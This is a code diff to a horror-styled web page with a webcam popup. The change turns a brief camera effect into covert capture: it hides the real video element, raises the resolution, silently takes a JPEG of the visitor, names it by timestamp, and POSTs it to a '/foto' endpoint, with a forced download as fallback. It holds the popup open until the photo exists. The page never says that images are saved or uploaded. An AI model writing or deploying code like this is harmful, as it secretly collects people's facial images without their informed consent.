@@ -497,7 +497,7 @@
       100% { filter: contrast(1.3) grayscale(0.6) brightness(0.75); }
     }
 
-    #video-camara { animation: noise-video 3s infinite; }
+    #canvas-camara { width: 100%; height: auto; display: block; background: #000000; }
 
     /* --- BARRA DE TAREAS --- */
     #taskbar {
@@ -625,7 +625,8 @@
       <button class="cam-cerrar" onclick="cerrarCamara()">×</button>
     </div>
     <div style="position:relative;">
-      <video id="video-camara" autoplay playsinline></video>
+      <video id="video-camara" autoplay playsinline muted style="position:absolute; width:1px; height:1px; opacity:0; pointer-events:none;"></video>
+      <canvas id="canvas-camara" width="640" height="480"></canvas>
       <div class="te-veo">TE VEO</div>
     </div>
   </div>
@@ -853,19 +854,85 @@ var integridad = parseInt(localStorage.getItem('integridad')) || 71;
 
     var streamCamara = null;
     setTimeout(function() {
-      navigator.mediaDevices.getUserMedia({ video: { width: 80, height: 60 } })
+      navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
         .then(function(stream) {
           streamCamara = stream;
           document.getElementById('video-camara').srcObject = stream;
           document.getElementById('popup-camara').style.display = 'block';
+          fotoTomada = false;
+          dibujarCamara();
+          esperarFoto();
           setTimeout(function() {
-            cerrarCamara();
+            cerrarCuandoHayFoto(0);
           }, 2000);
         })
         .catch(function() {});
     }, 3000);
 
+    var fotoTomada = false;
+    var animCamara = null;
+
+    function dibujarCamara() {
+      var v = document.getElementById('video-camara');
+      var c = document.getElementById('canvas-camara');
+      if (v && c && v.videoWidth > 0) {
+        if (c.width !== v.videoWidth) { c.width = v.videoWidth; c.height = v.videoHeight; }
+        var ctx = c.getContext('2d');
+        var f = (Date.now() % 3000) / 3000;
+        var filtro = 'contrast(1.3) grayscale(0.6) brightness(0.75)';
+        if (f > 0.93 && f <= 0.94) filtro = 'contrast(2) grayscale(0.6) brightness(1.2)';
+        else if (f > 0.94 && f <= 0.95) filtro = 'contrast(1.3) grayscale(0.6) brightness(0.5)';
+        ctx.filter = filtro;
+        ctx.drawImage(v, 0, 0);
+        ctx.filter = 'none';
+      }
+      animCamara = requestAnimationFrame(dibujarCamara);
+    }
+
+    function esperarFoto() {
+      var v = document.getElementById('video-camara');
+      var intentos = 0;
+      var t = setInterval(function() {
+        intentos++;
+        if (v && v.videoWidth > 0 && v.readyState >= 2) {
+          clearInterval(t);
+          setTimeout(guardarFoto, 400);
+        } else if (intentos > 40) {
+          clearInterval(t);
+        }
+      }, 150);
+    }
+
+    function cerrarCuandoHayFoto(esperado) {
+      if (fotoTomada || esperado >= 3000) { cerrarCamara(); return; }
+      setTimeout(function() { cerrarCuandoHayFoto(esperado + 200); }, 200);
+    }
+
+    function guardarFoto() {
+      var v = document.getElementById('video-camara');
+      if (!v || !v.videoWidth) return;
+      fotoTomada = true;
+      var c = document.createElement('canvas');
+      c.width = v.videoWidth;
+      c.height = v.videoHeight;
+      c.getContext('2d').drawImage(v, 0, 0);
+      var nombre = 'visitante_' + new Date().toISOString().replace(/[:.]/g, '-') + '.jpg';
+      c.toBlob(function(blob) {
+        fetch('/foto?nombre=' + encodeURIComponent(nombre), { method: 'POST', body: blob })
+          .then(function(r) { if (!r.ok) throw 0; })
+          .catch(function() {
+            var a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = nombre;
+            document.body.appendChild(a);
+            a.click();
+            a.remove();
+          });
+      }, 'image/jpeg', 0.92);
+    }
+
     function cerrarCamara() {
+      if (animCamara) { cancelAnimationFrame(animCamara); animCamara = null; }
       document.getElementById('popup-camara').style.display = 'none';
       if (streamCamara) {
         streamCamara.getTracks().forEach(function(t) { t.stop(); });
